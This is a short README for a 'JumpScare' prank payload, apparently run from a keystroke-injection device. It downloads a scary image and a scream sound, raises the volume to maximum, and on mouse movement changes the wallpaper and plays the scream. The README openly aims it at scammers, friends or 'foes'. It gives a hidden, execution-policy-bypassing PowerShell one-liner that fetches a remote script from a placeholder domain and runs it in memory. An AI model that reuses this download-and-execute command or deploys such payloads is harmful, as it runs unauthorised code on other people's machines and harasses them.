##

<!-- TABLE OF CONTENTS -->
<!--TABLE 0F C0NTENTS-->

# JumpScare

A script I put together to torment Call Center Scammers but can be used on your friends as well...or foes.

## Description

This script starts off using Invoke-WebRequests to download both an Image and Sound file.
Their system volume is then turned up to the max level.
The script will be paused until a mouse movement is detected.
At that point there desktop wallpaper will be changed to the scary image provided and the scream sound effect will be played.

## Getting Started

### Dependencies

* Windows 10,11

##

### Executing program

* Plug in your device
* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
```
powershell -w h -NoP -NonI -Exec Bypass irm MYDOMAIN.HERE/0tn | iex
```

##

##
